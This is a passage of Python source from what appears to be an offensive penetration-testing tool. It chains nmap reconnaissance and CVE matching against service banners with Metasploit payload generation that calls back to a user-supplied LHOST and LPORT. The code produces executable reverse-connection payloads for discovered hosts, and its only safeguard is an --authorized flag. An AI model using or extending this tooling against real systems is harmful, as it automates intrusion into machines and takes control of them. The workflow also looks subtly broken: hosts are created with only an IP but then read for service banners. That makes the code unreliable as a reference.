    cve_id = cve_list[cve_choice]
    lhost = input("LHOST (callback IP): ").strip()
    lport = int(input("LPORT (default 4444): ") or "4444")
    fmt = input("Payload format (exe/elf/raw/py, default exe): ").strip() or "exe"
    output_dir = input("Output directory (default ./payloads): ").strip() or "./payloads"
    result = generate_msf_payload(cve_id, lhost, lport, output_dir, fmt, args.dry_run, cve_db)
    if result:
        metadata = {"cve_id": cve_id, "lhost": lhost, "lport": lport, "format": fmt, "output": str(result), "timestamp": datetime.now().isoformat(), "sha256": hashlib.sha256(result.read_bytes()).hexdigest()}
        if args.export:
            export_results(metadata, f"payload_meta_{int(time.time())}", args.export)
        return True
    return False

def integrated_workflow(args: argparse.Namespace) -> bool:
    if not args.authorized:
        logger.error("Integrated workflow requires explicit --authorized flag")
        return False
    print("\nStarting integrated recon -> analysis -> payload workflow")
    if not network_recon_workflow(args):
        return False
    hosts = []
    xml_files = list(OUTPUT_DIR.glob("nmap_scan_*.xml"))
    if xml_files:
        import xml.etree.ElementTree as ET
        for xf in xml_files:
            tree = ET.parse(xf)
            root = tree.getroot()
            for host in root.findall('.//host'):
                addr = host.find('.//address[@addrtype="ipv4"]')
                if addr is not None:
                    hosts.append(Host(ip=addr.get('addr')))
    if not hosts:
        logger.error("No hosts discovered for analysis")
        return False
    target = hosts[0]
    print(f"\nAnalyzing {target.ip} for vulnerabilities...")
    cve_db = init_cve_database()
    for port, banner in target.service_banners.items():
        matches = query_cve_database(cve_db, banner, "multi")
        if matches:
            print(f"\nPort {port} ({banner}):")
            for cve in matches[:3]:
                print(f"  - {cve.cve_id} (Reliability: {cve.reliability_score*100:.1f}%)")
                if input(f"Generate payload for {cve.cve_id}? (y/n): ").lower() == 'y':
                    lhost = input("LHOST: ").strip()
                    lport = int(input("LPORT: "))
                    generate_msf_payload(cve.cve_id, lhost, lport, dry_run=args.dry_run, cve_db=cve_db)
    return True

